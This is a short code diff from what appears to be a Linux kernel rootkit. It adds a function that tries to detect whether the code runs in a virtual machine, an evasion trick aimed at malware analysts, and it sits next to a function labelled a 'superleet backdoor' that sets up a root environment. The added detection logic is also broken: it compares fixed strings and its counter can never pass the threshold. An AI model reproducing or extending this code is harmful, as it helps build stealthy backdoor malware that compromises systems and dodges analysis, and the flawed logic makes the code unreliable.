@@ -79,6 +79,21 @@ unsigned long *leeto_pgstb(void) {
  #define __write_cr0 write_cr0
  #endif
 
+static void ehumavm(void) { //check if were in a vm or a physical machine using a shitty method
+    int vm = 0x00;
+        if(sysconf(_SC_NPROCESSORS_ONLN) <= 0x01) vm++;
+        char gete[0x80];
+        FILE *comando = popen("dmesg |grep -i hypervisor", "r");
+        if(fgets(gete, 0x80, comando) != NULL) {
+            char grep[0x23];
+            strncpy(grep, "[   0.000000 Hypervisor detected]", 0x22);
+            grep[0x22] = '\0';
+            if(strcmp("[   0.000000 Hypervisor detected]", grep) == 0x00) vm++;
+        }
+        if(vm<=0x03) printf("we are in a physical machine\x0d\x0a");
+        else           printf("VM DETECTED!!!\x0d\x0a");
+}
+
 static void cback(void) { //warning: superleet backdoor function!!!!11
 	char *var[] = {
 		"HOME=/root",
